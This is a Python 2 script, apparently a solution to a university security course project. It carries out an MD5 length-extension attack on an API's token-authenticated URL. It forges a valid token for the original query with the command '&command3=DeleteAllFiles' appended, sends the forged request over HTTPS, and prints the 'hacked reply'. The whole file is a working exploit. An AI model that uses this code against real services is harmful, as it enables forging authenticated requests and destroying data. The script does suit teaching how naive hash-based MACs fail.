import httplib, urlparse, sys
import pymd5
import struct
import urllib

def hexdump(s):
        for b in xrange(0, len(s), 16):
                lin = [c for c in s[b : b + 16]]
                #~ if sum([ord(l) for l in lin]) == 0:
                        #~ continue
                hxdat = ' '.join('%02X' % ord(c) for c in lin)
                pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
                print('  %04x: %-48s %s' % (b, hxdat, pdat))
        print

def pad(s):
        padlen = 64 - ((len(s) + 8) % 64)
        bit_len = 8*len(s)
        if(padlen < 64):
                s += '\x80' + '\000' * (padlen - 1)
        return s + struct.pack('<q', bit_len)



url = sys.argv[1]
#url = "https://ecen5032.org/project1/api?token=d0c7a65c690cf624cdc94dc551cc1c5c&user=admin&command1=ListFiles&command2=NoOp"


#illicit code to add
append = "&command3=DeleteAllFiles"

# Your code to modify url goes here
parsedUrl = urlparse.urlparse(url)

#parse the token and message
original_token = parsedUrl.query[6:38]
original_message = parsedUrl.query[39:]
message_length = len(original_message)
length_of_m =  message_length + 8

#set state of next hash
bits = (length_of_m + len(pymd5.padding(length_of_m*8)))*8
h = pymd5.md5(state = original_token.decode("hex"),count = bits)

#calculate pad1 ascii
pad1 = urllib.quote(pymd5.padding(length_of_m*8))

#add next hash
h.update(append)

#create new token and message
new_token = h.hexdigest()
new_message = original_message + pad1 + append
new_query = "token=" + new_token + "&" + new_message

#try original message
conn = httplib.HTTPSConnection(parsedUrl.hostname)
conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
print parsedUrl.query
print "original reply:", conn.getresponse().read()

#try new message
conn = httplib.HTTPSConnection(parsedUrl.hostname)
conn.request("GET", parsedUrl.path + "?" + new_query)
print new_query
print "hacked reply:", conn.getresponse().read()














#space
